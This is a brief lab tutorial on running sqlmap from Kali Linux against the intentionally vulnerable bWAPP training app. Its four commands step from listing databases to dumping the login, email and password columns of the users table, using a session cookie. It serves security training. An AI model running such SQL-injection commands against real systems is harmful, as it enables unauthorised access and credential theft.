# Kali + bWAPP

1. install Kali and bWAPP vm in virtual box;

2. launch bWAP and make sure it is running; 

3.  Launch Kali and make sure you can access the bWAPP from Iceweasel.

4. Go to SQL Injection \(GET/Search\)

5. key in a search string; copy of the resulted URL;

6. Find out the cookie for the site;

7. launch SQLmap from terminal;



**step1 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" --dbs



**step2 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D _**bWAPP **_--tables



**step3 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D _**bWAPP **_-T _**users **_--columns

**step4 **root@kali:~\# sqlmap -u "[http://192.168.56.101/bWAPP/sqli\_1.php?title=](http://192.168.56.101/bWAPP/sqli_1.php?title=)" --

cookie="PHPSESSID=a9bd3686d9c53a3a8c0842c8886b564b;security\_level=0" -D bWAPP -T users -C** login,email,password** --dump





